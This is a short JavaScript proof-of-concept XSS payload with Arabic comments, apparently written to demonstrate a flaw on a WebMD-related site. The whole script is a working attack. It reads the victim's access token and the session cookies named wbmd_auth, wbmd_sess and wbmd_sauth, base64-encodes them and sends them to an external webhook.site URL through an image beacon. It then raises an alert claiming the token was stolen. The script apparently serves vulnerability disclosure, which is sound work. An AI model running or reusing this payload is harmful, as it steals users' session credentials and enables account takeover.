// evil-script.js - PROOF OF CONCEPT (REMOTE EXFILTRATION)
console.log("PoC Script Executed - Exfiltrating Data...");

// 1. استخراج التوكن الخاص بالضحية
const token = window.__INITIAL_STATE__?.accessToken || 'Not_Found';

// 2. استخراج الكوكيز الحساسة فقط لتقليل حجم البيانات
const wanted = ['wbmd_auth', 'wbmd_sess', 'wbmd_sauth'];
let criticalCookies = document.cookie.split('; ')
    .filter(c => wanted.some(w => c.toLowerCase().includes(w)))
    .join('; ');

// 3. تجهيز البيانات (Payload)
const payload = {
    t: token,
    c: criticalCookies || "No_Cookies",
    u: window.location.href,
    ts: new Date().getTime()
};

// 4. تشفير البيانات بصيغة Base64 لتجنب مشاكل الرموز في الروابط
const encodedData = btoa(JSON.stringify(payload));

// 5. رابط الاستقبال (استبدل هذا برابط Webhook.site الخاص بك)
const exfilUrl = "https://webhook.site/26e1b70c-6086-498e-9474-e473df7babfd"; 

// 6. الإرسال عبر Image Beacon (الطريقة الأضمن)
// المتصفح سيعتبر هذا طلب صورة وسيرسل البيانات في الرابط (Query String)
const logger = new Image();
logger.src = `${exfilUrl}?data=${encodedData}`;

// 7. إظهار تنبيه للتأكيد البصري في الفيديو
alert(
    "CRITICAL: XSS Executed!\n" +
    "Session Token Stolen: " + token.substring(0, 15) + "...\n" +
    "Data exfiltrated to: attacker-server.com"
);

console.log("Data sent to attacker server via Image Beacon.");
